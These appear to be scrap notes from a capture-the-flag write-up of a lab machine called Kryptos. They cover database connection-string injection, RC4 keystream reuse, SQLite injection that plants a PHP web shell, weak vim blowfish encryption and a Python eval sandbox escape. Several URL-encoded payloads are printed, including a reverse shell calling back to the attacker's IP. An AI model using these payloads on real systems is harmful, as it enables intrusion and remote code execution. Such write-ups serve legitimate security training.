**Kryptos - Scrap notes**

The initial login page accepts:
1. username
2. password

The parametesr contain hidden form fields, such as db, and token (anti csrf protection)

The initial login page lets us inject on the db parameter, and allows us to control the connection string
We set up our own database to mimic the application's db. 
This was done by viewing the /var/log/mysql files to understand what the application code was trying to do. 
By using wireshark, in combination with the logs, we can slowly re-create the databased used for authetication flows
One step was to use responsder3 to capture the database username and password hash
Once we had that, we could create the authentication table  

**rc4-web-step.py**
After the initial login page where we injected on the dbconnection string

We are presented with a web page that allows us to:
1. Enter a URL (e.g. http://ourIp/file.txt)
2. select an encryption algo (AES-128, RC4)
3. The application will retrieve our file and encrypt the plaintext contents
4. The application will display the ciphertext

The application was not vulnerable to RFI/LFI. The objective was to find a weakness in the implementation of the encryption functionality. 
Let's see if there's a way to retrieve the key.

We notice that when we use RC4, and encrypt the same file multiple times, the ciphertext is always the same
This shouldn't be the case in RC4- as we can see the keystream being reused from the beginning each time

if we take p(1) xor k(1) it produces c(1)
since k(1) always starts from the beginning of the keystream

We can feed the application a file that contains our ciphertext. since the keystream always starts at the beginning per request, we can recover the plaintext 

From enumeration, we noticed we could refer to <appserverIP>/dev directory and get a response
So what we'd have to do is:
  
 1. Point the application to <appserverIP>/dev 
 2. The application will return the encrypted contents of /dev/index.html
 3. We save the ciphertext contents to a file
 4. Now we make another request to the server, this time pointing to our file that contains the ciphertext contents from 2.
 5. We scrape the body of the response. It will contain the plaintext contents of /dev/index.html
  
After finding a page vulnerable to LFI, we end up using php://filter to dump the source files of a sqlite test page
The SQLlite test page was vulnerable to sql injection, and the app tell us that database files are stored within the  d9e28afcf0b274a5e0542abb67db0784 directory. We can perform a sqli, attach a database and name it a .php file. then insert php code into a table. 
Then we navigate to the d9e28afcf0b274a5e0542abb67db0784/ourphp.php file 

e.g.
`
http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1;attach%20database%20'd9e28afcf0b274a5e0542abb67db0784/test16.php'%20as%20pee;create%20table%20pee.own4%20(dataz%20TEXT);insert%20into%20pee.own4%20(dataz)%20values%20('<%3fphp%20phpinfo();%3f>');"
`  

`
http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1;attach%20database%20'd9e28afcf0b274a5e0542abb67db0784/test36.php'%20as%20pee;create%20table%20pee.own4%20(dataz%20TEXT);insert%20into%20pee.own4%20(dataz)%20values%20(%22<%3fphp%20phpinfo();echo%20'testing2';%20echo%20exec('whoami');%3f>%22);"    
`

phpinfo lists a set of disabled functions, however proc_open is not disabled 
Therefore we can reverse shell with
`
http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1;attach%20database%20'd9e28afcf0b274a5e0542abb67db0784/test50.php'%20as%20pee;create%20table%20pee.own4%20(dataz%20TEXT);insert%20into%20pee.own4%20(dataz)%20values%20(%22<%3fphp%20;%20echo%20phpversion();echo%20'<pre>';%24sock%3dfsockopen('<ourIP>',80);%24proc%3dproc_open('/bin/sh%20-i',array(0%3d>%24sock,1%3d>%24sock,2%3d>%24sock),%24pipes);echo%20'<%2fpre>';%3f>%22);"
` 

**vim-decrypt.py**  
Once we gain acccess to a shell we are presented with files creds.old (rjindael/<oldpassword>) and creds.txt  
creds.txt is encrypted, with the header "vimcrypt~02"  
Research into this shows us that this is using blowfish, and the implementation by VIM is weak  
  
vimcrypt~02 recycles the key for the first 8 blocks, and if part of the plaintext is known, we can recover the key used for at least the first 8 blocks (64 bytes)  
  
since we know that creds.old starts with rjindael, this is conveniently 8 bytes  
  
the script will use this knowledge and read the encrypted file, strip out the header, strip out the salt and iv, then try to xor  
firstblock xor plaintext to recover our key  
then move to secondblock xor key to recover the second block of plaintext.. and repeat until the 8th block  
  
kryptos.py  
once we've decrypted the login, we are finally presented with our final challenge.. included in kryptos.py  

this is a simple webs erver that accepts signed requests, and if the request is signed correctly, then eval is called with removed `__builtins__` evaluates the expression:   
`result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe `

there is a note about the key derivation ecdsa

** kryptos-breaker.py** 
our objective here is to find the seed used to derive the signing key... if we can do this, then we can forge requests to the server and have the server evaluate any expression that we send it
the next step is to break out of the python restrictions, since `__builtins__` is removed

we iterate through a sample size of 100000 and check just how random the prng is... turns out it only generates a limited set of potential seeds.. we save the potential seed values in allseeds.txt

now we iterate through the list of seeds, and derive signing keys with an expression of (2+2)

the script will do this until we hit a signing key that is accepted by the server

.. once we've found the seed, we save it to s.txt

now we send the following msg for evaluation (based on python breakouts)
`[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('cat /root/root.txt').read()`
